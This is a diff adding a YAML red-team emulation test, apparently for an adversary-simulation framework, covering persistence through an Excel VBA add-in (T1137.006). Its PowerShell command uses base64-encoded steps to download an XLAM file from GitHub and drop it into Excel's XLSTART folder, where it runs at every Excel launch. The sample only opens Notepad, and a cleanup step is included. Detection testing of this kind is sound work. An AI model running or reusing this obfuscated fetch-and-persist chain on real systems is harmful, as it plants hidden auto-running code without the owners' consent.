@@ -1,0 +1,20 @@
+- id: 72ca52dd-6f0d-5e40-ba81-e4032a0c822f
+  name: Soumaia ART Tests - Persistent Code Execution Via Excel VBA Add-in File (XLAM)
+  description: 'Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started
+
+    The sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.'
+  tactic: persistence
+  technique:
+    attack_id: T1137.006
+    name: 'Office Application Startup: Add-ins'
+  platforms:
+    windows:
+      psh:
+        command: "powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBFAHgAYwBlAGwALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIgAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAiAEUAeABjAGUAbAAiAAoAIAAgAGUAeABpAHQAIAAwAAoAfQAgAGMAYQB0AGMAaAAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgA=\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAEUAeABjAGUAbAAgAG0AYQBuAHUAYQBsAGwAeQAgAHQAbwAgAG0AZQBlAHQAIAB0AGgAaQBzACAAcgBlAHEAdQBpAHIAZQBtAGUAbgB0ACIACgA=\n}\npowershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEUAeABjAGUAbABWAEIAQQBhAGQAZABpAG4ALgB4AGwAYQBtACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABBAGQAZABpAG4AcwAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMwA3AC4AMAAwADYALwBiAGkAbgAvAEEAZABkAGkAbgBzAC8ARQB4AGMAZQBsAFYAQgBBAGEAZABkAGkAbgAuAHgAbABhAG0AIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABFAHgAYwBlAGwAVgBCAEEAYQBkAGQAaQBuAC4AeABsAGEAbQAiAA==\n}\nCopy \".\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\""
+        cleanup: |-
+          Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
+          Start-Sleep 3
+          Remove-Item "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam" -ErrorAction Ignore
+        payloads:
+        - Addins
+        - ExcelVBAaddin.xlam
